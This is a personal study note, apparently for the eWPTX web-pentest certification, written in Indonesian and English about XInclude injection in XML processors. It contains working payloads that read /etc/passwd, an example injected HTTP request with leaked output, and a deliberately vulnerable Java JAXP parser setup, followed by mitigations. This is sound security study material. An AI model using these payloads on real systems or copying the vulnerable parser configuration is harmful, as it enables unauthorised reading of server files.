2026-02-04 17:55

Status:

Tags: [[eWPTX]] [[XML]]
###### Prasyarat: [[XML Injection - Attack Types]]
# XInclude Injection

## Gambaran singkat

XInclude injection terjadi ketika XML processor mendukung XInclude dan input yang bisa dikontrol user mempengaruhi apa yang akan di-include. Ini penting karena **kamu tidak perlu mengontrol DOCTYPE** — XInclude bisa jalan walau kamu tidak bisa mendefinisikan custom entity.

## Kapan XInclude bekerja vs XXE

| Scenario                                    | XXE  | XInclude |
|---------------------------------------------|------|----------|
| You control the full XML document           | Yes  | Yes      |
| You control only a value inside existing XML | No   | **Yes**  |
| DTD processing is disabled                  | No   | **Yes**  |
| Server uses JSON-to-XML conversion          | No   | **Yes**  |

XInclude sering jadi teknik pilihan ketika input kamu hanya “ditanam” ke dokumen XML server-side dan kamu tidak bisa menyisipkan deklarasi `<!DOCTYPE>`.

## Payload dasar

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

Deklarasi namespace `xmlns:xi` wajib. Tanpa itu, processor biasanya mengabaikan elemen `xi:include`.

## parse="text" vs parse="xml"

**parse="text"** (paling berguna untuk attack):
- Includes the target as plain text
- No XML parsing of the included content
- Works for reading `/etc/passwd`, source code, config files

```xml
<xi:include parse="text" href="file:///etc/passwd"/>
```

**parse="xml"** (default jika dihilangkan):
- Included content must be well-formed XML
- Fails on non-XML files (parse error)
- Useful for including other XML config files

```xml
<xi:include parse="xml" href="file:///etc/spring-config.xml"/>
```

## Injeksi via HTTP request

Penyerang menyisipkan payload ke parameter yang kemudian dimasukkan ke XML di sisi server.

**Request:**
```http
POST /api/check HTTP/1.1
Content-Type: application/x-www-form-urlencoded

productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

The server builds XML like:
```xml
<?xml version="1.0"?>
<stockCheck>
  <productId>
    <foo xmlns:xi="http://www.w3.org/2001/XInclude">
      <xi:include parse="text" href="file:///etc/passwd"/>
    </foo>
  </productId>
</stockCheck>
```

**Response (if vulnerable):**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

## Contoh kode Java JAXP yang rentan

```java
// VULNERABLE: XInclude enabled by default in some configurations
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setNamespaceAware(true);
dbf.setXIncludeAware(true);  // explicitly enables XInclude
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(new InputSource(new StringReader(userInput)));
```

## Mitigasi

**Java JAXP:**
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setXIncludeAware(false);
dbf.setFeature("http://apache.org/xml/features/xinclude", false);
```

**Python lxml:**
```python
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)
# lxml does not support XInclude by default unless you call xinclude()
# Do NOT call tree.xinclude() on untrusted input
```

**General rules:**
- Matikan pemrosesan XInclude kecuali memang dibutuhkan
- Jika XInclude diperlukan, whitelist skema dan path `href` yang diperbolehkan
- Pastikan input user tidak bisa menyisipkan deklarasi namespace XML
